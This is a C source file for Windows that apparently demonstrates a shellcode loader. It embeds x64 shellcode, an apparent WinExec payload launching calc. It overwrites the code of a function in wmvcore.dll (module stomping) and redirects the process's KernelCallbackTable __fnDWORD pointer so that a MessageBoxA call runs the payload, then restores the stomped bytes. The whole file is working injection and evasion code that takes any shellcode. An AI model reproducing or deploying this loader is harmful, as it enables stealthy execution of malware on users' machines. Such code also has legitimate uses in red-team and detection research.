#include <Windows.h>
#include <stdio.h>
#include <ProcessSnapshot.h>
#include "structs.h"

#define CLEAN TRUE

unsigned char rawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

char Buffer[1024]; // this var will hold the place in memory that we wil overwrite, so that we can re-patch to normal after the shellcode runs 

BOOL Check_fnDWORDAfterOverWriting(HANDLE TargetProcess) {
    KERNELCALLBACKTABLE kct;
    DWORD PssSuccess;
    PEB peb;
    PSS_PROCESS_INFORMATION PI;
    SIZE_T lpNumberOfBytesRead;
    HPSS SnapshotHandle;
    PssSuccess = PssCaptureSnapshot(TargetProcess,PSS_QUERY_PROCESS_INFORMATION,NULL,&SnapshotHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    PssSuccess = PssQuerySnapshot(SnapshotHandle,PSS_QUERY_PROCESS_INFORMATION,&PI,sizeof(PSS_PROCESS_INFORMATION));
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssQuerySnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    else {
        ReadProcessMemory(TargetProcess, PI.PebBaseAddress, &peb, sizeof(peb), &lpNumberOfBytesRead);
        if (lpNumberOfBytesRead == 0) {
            printf("[!] [peb]ReadProcessMemory failed: Win32 error %d \n", GetLastError());
            return FALSE;
        }
        else {
            memcpy(&kct, peb.KernelCallbackTable, sizeof(kct));
            printf("[i] [AFTER]kct.__fnDWORD : %0-16p \n", (void*)kct.__fnDWORD);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL Get_fnDWViaKCTAndHijack(HANDLE TargetProcess, PVOID WMIsAO_ADD, BOOL Clean) {
    KERNELCALLBACKTABLE kct, Newkct;
    PEB peb = {0};
    PSS_PROCESS_INFORMATION PI;
    HPSS SnapshotHandle;
    PVOID pNewkct;
    DWORD PssSuccess, Old;
    BOOL Success;
    SIZE_T Size = sizeof(rawData), lpNumberOfBytesWritten;

    PssSuccess = PssCaptureSnapshot(
        TargetProcess,
        PSS_QUERY_PROCESS_INFORMATION,
        NULL,
        &SnapshotHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    PssSuccess = PssQuerySnapshot(
        SnapshotHandle,
        PSS_QUERY_PROCESS_INFORMATION,
        &PI,
        sizeof(PSS_PROCESS_INFORMATION)
    );
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssQuerySnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    if (PI.PebBaseAddress == NULL) {
        printf("[!] PI.PebBaseAddress IS NULL \n");
        return FALSE;
    }
    else {
        //ReadProcessMemory(TargetProcess, PI.PebBaseAddress, &peb, sizeof(peb), &lpNumberOfBytesRead);
        RtlMoveMemory(&peb, PI.PebBaseAddress, sizeof(PEB));
        if (peb.KernelCallbackTable == 0){
            printf("[!] KernelCallbackTable is NULL : Win32 error %d \n", GetLastError());
            return FALSE;
        }
        else {
            memcpy(&kct, peb.KernelCallbackTable, sizeof(kct));
            printf("[i] [BEFORE]kct.__fnDWORD : %0-16p \n", (void*) kct.__fnDWORD);
            if (Clean ==  TRUE){
                //ReadProcessMemory(TargetProcess, WMIsAO_ADD, &Buffer, Size, &lpNumberOfBytesRead);
                RtlMoveMemory(&Buffer, WMIsAO_ADD, Size);
                if (Buffer == NULL) {
                    printf("[!] Buffer is NULL: Win32 error %d \n", GetLastError());
                    return FALSE;
                }
            }
            Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_READWRITE, &Old);
            if (Success != TRUE) {
                printf("[!] [1] VirtualProtect failed: Win32 error %d \n", GetLastError());
                return FALSE;
            }
            
            memcpy(WMIsAO_ADD, rawData, Size);

            Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_EXECUTE_READWRITE, &Old);
            if (Success != TRUE) {
                printf("[!] [2] VirtualProtect failed: Win32 error %d \n", GetLastError());
                return FALSE;
            }
            printf("[i] WMIsAO_ADD : %0-16p \n", (void*)WMIsAO_ADD);
            
           
            memcpy(&Newkct, &kct, sizeof(KERNELCALLBACKTABLE));
            Newkct.__fnDWORD = (ULONG_PTR)WMIsAO_ADD;

            pNewkct = VirtualAlloc(NULL, sizeof(KERNELCALLBACKTABLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            memcpy(pNewkct, &Newkct, sizeof(KERNELCALLBACKTABLE));

           
            Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), PAGE_READWRITE, &Old);
            //WriteProcessMemory(TargetProcess, (PBYTE)PI.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR), &lpNumberOfBytesWritten);
            RtlMoveMemory((PBYTE)PI.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR));
            Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), Old, &Old);
            //if (lpNumberOfBytesWritten == 0) {
            //    printf("[!] WriteProcessMemory failed: Win32 error %d \n", GetLastError());
            //    return FALSE;
            //}
            //else {
                Check_fnDWORDAfterOverWriting(TargetProcess);
                MessageBoxA(NULL, "test", "test", MB_OK); //this will trigger the shellcode, and u wont see the messagebox ;0
                if (Clean == TRUE) {
                    //WriteProcessMemory(TargetProcess, WMIsAO_ADD, &Buffer, sizeof(Buffer), &lpNumberOfBytesWritten);
                    RtlMoveMemory(WMIsAO_ADD, Buffer, sizeof(Buffer));
                    ZeroMemory(Buffer, sizeof(Buffer));
                }
            //}
            return TRUE;
        }
    }
    return FALSE;
}


int main() {
    
    PVOID WMIsAO_ADD;
    HMODULE wmvcoreHMandle, User;
    User = LoadLibraryA("user32.dll");
    
    /*
       WE WILL UPDATE THE WAY WE GET THE ADDRESS OF WMIsAvailableOffline FUNCTION
    */

    //getting WMIsAvailableOffline address:
    wmvcoreHMandle = LoadLibraryA("wmvcore.dll");
    WMIsAO_ADD = GetProcAddress(wmvcoreHMandle, "WMIsAvailableOffline");
    printf("[i] WMIsAvailableOffline ADD ::: %0-16p \n", WMIsAO_ADD);

    //hijacking:
    Get_fnDWViaKCTAndHijack(GetCurrentProcess(), WMIsAO_ADD, CLEAN);

    //this probably wont hit execution
    printf("[+] Press any key to exit ...\n");
    getchar();
    
    return 0;
}